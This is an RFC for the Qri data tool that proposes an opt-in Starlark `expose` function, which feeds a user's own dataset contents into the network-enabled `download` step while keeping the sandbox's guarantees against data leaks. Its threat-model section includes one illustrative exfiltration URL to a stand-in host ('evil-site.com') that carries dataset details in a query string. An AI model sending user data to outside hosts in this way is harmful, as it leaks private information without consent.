- Feature Name: Expose special function
- Start Date: <!-- (fill me in with today's date, YYYY-MM-DD) -->
- RFC PR: <!-- (leave this empty) -->
- Issue: <!-- (leave this empty) -->

# Summary
[summary]: #summary

A way to access data from a dataset in the special `download` function of Starlark scripts, without breaking the safety guarantees that Qri provides.

# Motivation
[motivation]: #motivation

Qri includes the Starlark programming language as a way to automate transformations against datasets. One of the benefits of embedding Starlark is that it includes a heap of safety guarantees: the language is sandboxed with no access the filesystem or similar OS facilities, it is non-Turing Complete which guarantees execution will terminate, has limitations on its memory usage, and more. The main draw of using this kind of restricted language as opposed to a do-whatever-you-want embedded general-purpose language is that users can trust that unknown code is always safe to run. We make it easy for Qri to just "do the right thing" without requiring users to audit or understand what's happening under the hood in order to avoid doing anything dangerous or destructive.

This safety and trust is integral to what makes Qri powerful for Data Science. Therefore, we should do as much as possible to reinforce this approach with how Starlark operates. The specific situation that this RFC addresses involves the nature of dataflow with regards to HTTP access. Even with all the safety guarantees that Starlark provides, we open ourselves up to potential pitfalls when we provide network access to transformation scripts. Accessing network resources can be used for malicious purposes, and has proven to be a problem even for other sandboxed languages such as Javascript.

Following the same principles outlined above, the approach we should take is to limit network access by only allowing data to be downloaded from other sources, but never to be uploaded. In other words, isolate network-enabled code from datasets, requiring transformations to flow data from the `download` function into the `transform` function, which is able to combine the results of a download with a dataset that has an existing version.

With this system in place, however, certain use cases and workflows become especially difficult. For example, if I'm building a dataset that includes urls that specify where to retrieve updates from at a later date, my transformation needs to get access to these urls. Since the dataset was something I built, and I'm running my own transform against it, I can be certain that there's nothing negative that could happen by piping these urls into the `download` function. In this case, I should be able to opt-in to some sort of dataflow that sends information to my network-aware `download` function.

The facility described in this RFC is `expose`, a new special function in our Starlark system that enables this sort of use case. By default, a user cannot run `expose`, but through an opt-in mechanism is able to enable it for their own use. We expect that the primary need for `expose` will be getting access to a user's own dataset that they have built and then want to access, rather than using it to integrate datasets made by other users. We need to be careful in how this feature is documented, so that users do not needlessly enable it, opening themselves up to information leakage that they didn't intend.

# Guide-level explanation
[guide-level-explanation]: #guide-level-explanation

### starlark

The special function `expose` is a top-level entry point in Starlark scripts that works as follows:

```
  # Defined with the same signature as "transform"
  def expose(ds, ctx):
    # ds is read-only for this function
    urls = [row['url'] for row ds.get_body()]
    return urls

  def download(ctx):
    # Download function can get the result using ctx.expose
    for url in ctx.expose:
      res = http.get(url)
      ...
```

Similarily to how `transform` gets the results of `download` by accessing `ctx.download`, the results of `expose` are available as `ctx.expose`. This leads to a consistent access pattern, and also has the pleasant side-effect of not needing to change the signature of `download`.

### command-line

By default, the `expose` function should be disabled. Running a script with a function named `expose` should result in an error about it being disallowed. The only way to run such a script is to explicitly opt-in by using a special command-line flag, preferably one that is named in a somewhat scary manner that would hint to the average user that it shouldn't be used without understanding it. One such possibility is:

```
qri save --file my_transform.star --transform-expose-all-datasets me/ds
```

Further considerations:

* We may want to allow a user to run `expose` only if they both wrote and own the transform script and previous version of the dataset.
* In future iterations, the `expose` function could probably be replaced by a simple Path evaluation, once Qri has functionality analogous to XPath.

# Reference-level explanation
[reference-level-explanation]: #reference-level-explanation

### qri/startf/transform.go

References to download will be copied and renamed for expose:

* transform.download starlark.Iterable
* specialFuncs "download"
* callDownoadFunc (with the additional check for the expose flag)

The dataset passed to callExposeFunc must be kept as immutable, by not calling `SetMutable`.

### qri/cmd/save.go

A new flag (suggested --transform-expose-all-datasets above) added to the command. This needs to be passed down the call stack to the startf package.

### qri/update

The flag needs to be somehow integrated here. Somewhat of an open question as to how this works.

# Drawbacks
[drawbacks]: #drawbacks

We should definitely do this instead of allowing unfettered access to the `dataset` within the `download` function.

One drawback is that we're introducing a new command-line flag. It is possible that this flag is only going to be temporary, and may be deprecated in the future in order to provide a more fine-grained way to expose certain parts of a dataset.

# Rationale and alternatives
[rationale-and-alternatives]: #rationale-and-alternatives

Though we currently have no facility for explicitly private data, and talk about Qri as being meant for public-only data, there are still situations where allowing the uploading of data in a function like `download` could break user expectations of how data-flow works.

For example, let's say a user has a local mesh network setup to host Qri instances that communicate between each other. Their network is configured such that IPFS only shares data between their machines, avoiding block sharing with the larger distributed web.

In the meantime, they have some complicated data download and processing pipeline, employing some third-party libraries that they themselves didn't author. If one of those libraries were behaving naughtily, and were given full access to the user's datasets, it could get information about those datasets and upload them to some server using url query parameters like "http://evil-site.com/q?your_dataset_size=1234". Clearly this is not destructive as other bad consequences (file system access, privilege escalation) but even minor information leaks like this could erode trust in Qri.

# Prior art
[prior-art]: #prior-art

Browser extension systems has similar systems around permissions and code isolation. One similar situation is how extensions are allowed to update themselves, but the code to update is self-contained and is not allowed to feed information from the main extension body into the network requests for fetching a new version.


# Unresolved questions
[unresolved-questions]: #unresolved-questions

The future of permissions, security, ACLs, and private data. All have complicated interactions with everything mentioned in this document.